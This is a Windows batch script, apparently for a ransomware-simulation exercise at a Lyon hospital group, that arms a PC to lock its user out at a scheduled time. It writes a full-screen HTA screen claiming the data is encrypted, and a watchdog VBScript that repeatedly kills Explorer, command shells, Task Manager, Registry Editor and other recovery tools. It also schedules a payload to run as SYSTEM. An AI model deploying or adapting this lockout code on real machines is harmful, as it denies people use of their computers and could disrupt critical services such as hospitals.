@echo off
REM ================================================================
REM ARM_PC.BAT - Run as Admin on each PC in the morning
REM Creates lockscreen files, copies payload, schedules for 14:30
REM Keep payload.bat in the SAME FOLDER as this script (USB stick)
REM ================================================================

net session >nul 2>&1
if errorlevel 1 (
    echo [!] Right-click and select "Run as Administrator"
    pause
    exit /b 1
)

echo.
echo ============================================
echo   ARMING PC FOR CYBER EXERCISE
echo ============================================
echo.

if not exist "C:\CyberExercise" mkdir "C:\CyberExercise"

REM ================================================================
REM Create HTA lockscreen
REM ================================================================
echo [+] Creating lockscreen...

(
echo ^<html^>^<head^>^<title^>HACKED^</title^>
echo ^<HTA:APPLICATION ID=L APPLICATIONNAME=L BORDER=none BORDERSTYLE=none CAPTION=no CONTEXTMENU=no INNERBORDER=no MAXIMIZEBUTTON=no MINIMIZEBUTTON=no NAVIGABLE=no SCROLL=no SELECTION=no SHOWINTASKBAR=no SINGLEINSTANCE=yes SYSMENU=no WINDOWSTATE=maximize /^>
echo ^<style^>
echo * { margin:0; padding:0; }
echo body { background:#0a0a0a; color:#ff0000; font-family:Courier New,monospace; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; overflow:hidden; cursor:none; }
echo .skull { font-size:80px; margin-bottom:20px; }
echo h1 { font-size:64px; text-transform:uppercase; letter-spacing:8px; text-shadow:0 0 20px #ff0000,0 0 40px #cc0000; margin-bottom:30px; }
echo .sub { font-size:24px; color:#cc0000; letter-spacing:5px; margin-bottom:10px; }
echo .info { font-size:16px; color:#555; margin-top:40px; }
echo ^</style^>
echo ^<script language=VBScript^>
echo Sub document_onkeydown : Set ev=window.event
echo  : If ev.altKey And ev.keyCode=115 Then ev.returnValue=False
echo  : If ev.ctrlKey And ev.keyCode=87 Then ev.returnValue=False
echo  : If ev.ctrlKey And ev.keyCode=27 Then ev.returnValue=False
echo  : If ev.altKey And ev.keyCode=9 Then ev.returnValue=False
echo  : If ev.keyCode=122 Then ev.returnValue=False
echo  : End Sub
echo  Sub window_onload : window.moveTo 0,0 : window.resizeTo screen.width,screen.height
echo  : setInterval "self.focus",200 : End Sub
echo ^</script^>^</head^>
echo ^<body ondragstart="return false" onselectstart="return false" oncontextmenu="return false"^>
echo ^<div class=skull^>^&#9760;^</div^>
echo ^<h1^>You Have Been Hacked^</h1^>
echo ^<div class=sub^>ALL YOUR SYSTEMS ARE COMPROMISED^</div^>
echo ^<div class=sub^>ALL YOUR DATA HAS BEEN ENCRYPTED^</div^>
echo ^<div class=info^>[ CYBER EXERCISE - HOSPICES CIVILS DE LYON ]^</div^>
echo ^</body^>^</html^>
) > "C:\CyberExercise\lockscreen.hta"

REM ================================================================
REM Create watchdog VBScript
REM ================================================================
echo [+] Creating watchdog...

(
echo Set oShell = CreateObject^("WScript.Shell"^)
echo Set oWMI = GetObject^("winmgmts:\\.\root\cimv2"^)
echo Do While True
echo   On Error Resume Next
echo   Set procs = oWMI.ExecQuery^("SELECT Name,ProcessId FROM Win32_Process"^)
echo   htaRunning = False
echo   For Each proc In procs
echo     pName = LCase^(proc.Name^)
echo     If pName = "explorer.exe" Then proc.Terminate
echo     If pName = "cmd.exe" Then proc.Terminate
echo     If pName = "powershell.exe" Then proc.Terminate
echo     If pName = "powershell_ise.exe" Then proc.Terminate
echo     If pName = "taskmgr.exe" Then proc.Terminate
echo     If pName = "regedit.exe" Then proc.Terminate
echo     If pName = "notepad.exe" Then proc.Terminate
echo     If pName = "control.exe" Then proc.Terminate
echo     If pName = "mmc.exe" Then proc.Terminate
echo     If pName = "msconfig.exe" Then proc.Terminate
echo     If pName = "mshta.exe" Then htaRunning = True
echo   Next
echo   If Not htaRunning Then
echo     oShell.Run "mshta.exe C:\CyberExercise\lockscreen.hta", 1, False
echo   End If
echo   WScript.Sleep 2000
echo Loop
) > "C:\CyberExercise\watchdog.vbs"

REM ================================================================
REM Copy payload from USB to C:\CyberExercise
REM ================================================================
echo [+] Copying payload...

if not exist "%~dp0payload.bat" (
    echo [!] ERROR: payload.bat not found next to this script!
    echo [!] Make sure payload.bat is in the same folder as arm_pc.bat
    pause
    exit /b 1
)

copy /y "%~dp0payload.bat" "C:\CyberExercise\payload.bat" >nul

REM ================================================================
REM Schedule for 14:30
REM ================================================================
echo [+] Scheduling for 14:30...

schtasks /delete /tn CyberExercise_Lockout /f >nul 2>&1
schtasks /create /tn CyberExercise_Lockout /tr "C:\CyberExercise\payload.bat" /sc once /st 14:30 /ru SYSTEM /rl HIGHEST /f

if errorlevel 1 (
    echo [!] FAILED to create scheduled task!
    pause
    exit /b 1
)

echo.
echo ============================================
echo   PC ARMED - LOCKOUT AT 14:30
echo ============================================
echo.
echo   To cancel:   schtasks /delete /tn CyberExercise_Lockout /f
echo   To test NOW: C:\CyberExercise\payload.bat
echo.
echo ============================================
pause
